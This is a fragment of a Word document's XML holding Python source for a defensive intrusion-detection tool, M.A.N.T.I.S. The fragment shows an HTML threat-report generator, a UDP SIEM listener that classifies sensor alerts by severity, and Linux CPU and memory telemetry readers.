      </w:r>
    </w:p>
    <w:p w14:paraId="659F3FD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kind, css = "Web Attack", "tag-web"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="296016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elif "BLACKLIST" in msg:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="664599D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kind, css = "Blacklist Hit", "tag-malware"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="172A9FB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rows.append(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="593E49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"&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;&lt;span class='tag %s'&gt;%s&lt;/span&gt;&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45A630F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(a["time"], css, kind, msg)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13B1F6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D3788FD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="468F18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html = """&lt;!DOCTYPE html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AB417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&lt;html&gt;&lt;head&gt;&lt;title&gt;MANTIS Threat Report&lt;/title&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69ED966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&lt;style&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AAF82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body{font-family:'Segoe UI',sans-serif;background:#1a1a1a;color:#f0f0f0;margin:0;padding:20px}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A3E76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h1{color:#00ff9d;border-bottom:2px solid #00ff9d;padding-bottom:10px}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69587D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.card{background:#2d2d2d;border-radius:8px;padding:20px;margin-bottom:20px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02CFF6F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box-shadow:0 4px 6px rgba(0,0,0,0.3)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F42490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table{width:100%;border-collapse:collapse;margin-top:10px}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF98A7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th,td{padding:12px;text-align:left;border-bottom:1px solid #404040}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C40A7E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th{background:#333;color:#00ff9d}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5776321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tr:hover{background:#383838}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C6D83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.tag{padding:4px 8px;border-radius:4px;font-size:12px;font-weight:bold}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="405FDC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.tag-ddos{background:#ff4444;color:#fff}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38A5B3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.tag-scan{background:#ffbb33;color:#000}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47D4F37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.tag-web{background:#33b5e5;color:#fff}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F8D023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.tag-malware{background:#aa66cc;color:#fff}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F9A8D4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.summary-box{display:flex;gap:20px}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="172A0D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.metric{background:#333;padding:15px;border-radius:5px;flex:1;text-align:center}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="434CDAE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.metric h3{margin:0;color:#888;font-size:14px}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76759B0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.metric p{margin:5px 0 0;font-size:24px;font-weight:bold;color:#fff}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18C9BC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&lt;/style&gt;&lt;/head&gt;&lt;body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E4D994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&lt;h1&gt;M.A.N.T.I.S. Forensic Report&lt;/h1&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51FF0F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&lt;div class="card"&gt;&lt;h2&gt;Session Summary&lt;/h2&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4108CDC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class="summary-box"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09CBA0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class="metric"&gt;&lt;h3&gt;Generated At&lt;/h3&gt;&lt;p&gt;__GENERATED_AT__&lt;/p&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63E6258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class="metric"&gt;&lt;h3&gt;Total Alerts&lt;/h3&gt;&lt;p&gt;__ALERT_COUNT__&lt;/p&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F39B80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class="metric"&gt;&lt;h3&gt;System Status&lt;/h3&gt;&lt;p style="color:#ff4444"&gt;COMPROMISED&lt;/p&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3456C40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7FAB43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&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="684FCC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&lt;div class="card"&gt;&lt;h2&gt;Incident Log&lt;/h2&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="585287A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&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Time&lt;/th&gt;&lt;th&gt;Threat Type&lt;/th&gt;&lt;th&gt;Details&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="712ACF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&lt;tbody&gt;__ALERT_ROWS__&lt;/tbody&gt;&lt;/table&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12583CE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&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E25AB7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&lt;div class="card"&gt;&lt;p&gt;Generated by M.A.N.T.I.S.&lt;/p&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="662F882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&lt;/body&gt;&lt;/html&gt;"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="488772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html = (html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F4EB70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.replace("__GENERATED_AT__", time.ctime())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59D004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.replace("__ALERT_COUNT__", str(len(self.alerts)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C53DE1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.replace("__ALERT_ROWS__", "".join(rows)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="587D1BF5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52A677E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open(self.filename, "w") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="575269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f.write(html)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FAB0C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print("\n[*] report written to", os.path.abspath(self.filename))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30066BE9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0166837E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54CF34F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__name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C2ED5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 = ReportGenerator()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD191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r.add_alert("DDoS DETECTED! Z-Score: 5.2")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51D73C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r.add_alert("PORT SCAN DETECTED! (Unique Ports: 44/sec)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="493C0F0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r.add_alert("MALICIOUS PAYLOAD! Keywords: ['UNION', 'SELECT']")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20192C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r.generate()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00CA23E0"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src/dashboard_ui/siem.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65CEE66B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>328 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D6A90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#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C43FB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socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="271EA9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threading</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E494F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json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D78659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os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EDECBD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sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="543DE8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time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="661F35F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http.server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5666A76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socketserver</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B306C9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from collections import deque</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC1A3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from urllib.parse import urlparse, parse_qs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB7F6B4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="528031A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sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AFEB55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utils.packet_store as packet_store</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="387F3E8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utils.pcap as pcap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="048F2AF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from utils.config import CONFIG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03704915" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05B06E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Central dashboard for multi-sensor deployment.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C7B47EF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="008379C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 CONFIG ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE3E5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UDP_PORT = 9999       # standard syslog port is 514, but we use 9999 to avoid root</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17E1315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HTTP_PORT = 8080      # Web Dashboard Port</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="352E9E8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MAX_ALERTS = 100      # Keep last 100 alerts in memory</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5884D5FE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B1264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 SHARED STATE ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BA6DD5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Stores alerts in memory. Thread-safe enough for this scale.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B8728A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ALERT_HISTORY = deque(maxlen=MAX_ALERTS)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B2F6F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ACTIVE_SENSORS = {}   # Map of IP -&gt; Last Seen Timestamp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55DFE85A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="09E1B45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SyslogUDPHandler:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32D039C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__init__(self, port):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="794689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self.port = port</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="221A874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self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EC4AB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Allow instant port reuse if the script restarts quickly</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A07437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self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53B4AA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self.sock.bind(('0.0.0.0', self.port))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55021636" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C1AF2E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start(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40E5673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print(f"[*] SIEM UDP Listener started on port {self.port}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BB5F7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import re</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EECBA3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legacy_format = re.compile(r'^\[\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}\]')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB09330" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="130B960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while True:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E8701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data, addr = self.sock.recvfrom(8192)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C5BFF7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sensor_ip = addr[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50645F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raw = data.decode('utf-8', errors='replace').strip()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35B876AD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00AD8F1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FR-5 sends structured JSON. Fall back to the original bracketed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D57EA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text format so a sensor running older code still reports, and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50D9AA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reject anything else - port 9999 is itself a scan target, so</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4970C42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arbitrary bytes do arrive here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="062184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entry = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EDA752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raw.startswith('{'):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DCDD3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4C29710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frame = json.loads(raw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CE203C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isinstance(frame, dict) and "message" in frame:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35B84B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entry = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A4694F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"message": frame.get("message", ""),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00CD08C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"severity": frame.get(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54D717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"severity",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AA9CB7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self._get_severity(frame.get("message", ""))),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EEEB1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"src_ip": frame.get("src_ip", ""),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="661B5FB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 frame.get("engine", ""),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4334243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"kind": frame.get("kind", ""),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="425DE3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"technique_id": frame.get("technique_id", ""),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26F0E5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"technique": frame.get("technique", ""),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02A6402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"tactic": frame.get("tactic", ""),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF823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"risk_score": frame.get("risk_score", 0),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="506C93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"confidence": frame.get("confidence"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7060E3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"payload_excerpt": frame.get("payload_excerpt", ""),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5008D32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D99663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ValueError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F25CA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entry = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CD8B659" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50D86C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entry is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19B6B7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legacy_format.match(raw):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11AE1FE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message = raw</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6009D6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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7477C01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message = ("INVALID UDP PAYLOAD (Raw Binary/Port Scan "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31107A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"detected on SIEM Listener)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="602E27D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entry = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65BB26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"message": message,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D3A7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"severity": self._get_severity(message),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DCCDEE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"src_ip": "", "engine": "", "kind": "",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6790B0E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"technique_id": "", "technique": "", "tactic": "",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34DFEF3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"risk_score": 0, "confidence": None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DE9655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"payload_excerpt": "",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DE118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F7640FE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06A81D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Update Sensor Status</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A76027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ACTIVE_SENSORS[sensor_ip] = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C48E174" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32FDD35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entry["id"] = len(ALERT_HISTORY) + 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EA287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entry["time"] = time.strftime("%H:%M:%S")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C3FB3D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entry["sensor"] = sensor_ip</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E2EAB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ALERT_HISTORY.appendleft(entry)  # Newest first</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16533D6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%s | %s | %s" % (sensor_ip,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1266965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entry.get("technique_id") or "-",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04A27B3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entry["message"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="685DF798" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77F083C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_get_severity(self, msg):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60FBF8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"DDoS" in msg: return "CRITICAL"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D7C21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"PAYLOAD" in msg: return "HIGH"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E25CB5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"SCAN" in msg: return "MEDIUM"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF761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"INFO"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F64B74E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45D90793" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32045CE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 Real host telemetry (Linux /proc, zero dependencies) ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C6C12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_LAST_CPU = {"total": 0, "idle": 0}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="091683F9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FD18F3F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="657128A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read_cpu_percent():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41321E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"""CPU utilisation from /proc/stat, sampled between calls. Linux only."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ACC1AA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4326B74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open("/proc/stat") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F5122D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parts = f.readline().split()[1:]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B341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vals = [int(x) for x in parts]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45E444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idle = vals[3] + (vals[4] if len(vals) &gt; 4 else 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6111D4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total = sum(vals)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0409493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d_total = total - _LAST_CPU["total"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="734A76E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d_idle = idle - _LAST_CPU["idle"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AC077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_LAST_CPU["total"], _LAST_CPU["idle"] = total, idle</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14B16B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d_total &lt;= 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7565D5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0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EAD236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round(100.0 * (d_total - d_idle) / d_total, 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33351CD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Exception:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17A00A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0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71BE776E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32F8AEFF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="095E46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read_mem_percent():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00B708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"""Memory utilisation from /proc/meminfo. Linux only."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08CE4D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6D70AB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info = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16639C5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open("/proc/meminfo") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0670FC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line in f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3796D79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 v = line.split(":")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30D89DA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info[k.strip()] = int(v.split()[0])  # kB</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01260B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total = info.get("MemTotal", 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B905D8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avail = info.get("MemAvailable", info.get("MemFree", 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C6138E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total &lt;= 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18D187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0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="393A6A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round(100.0 * (total - avail) / total, 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="111AB58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Exception:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B2D79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0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10062DCD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5817D8C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WebDashboardHandler(http.server.SimpleHTTPRequestHandler):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25E52DA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_send_json(self, obj):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="641633B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body = json.dumps(obj).encode('utf-8')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42C9F21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self.send_response(200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5858CED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self.send_header('Content-type', 'application/json; charset=utf-8')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6205002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self.send_header('Content-Length', str(len(body)))</w:t>
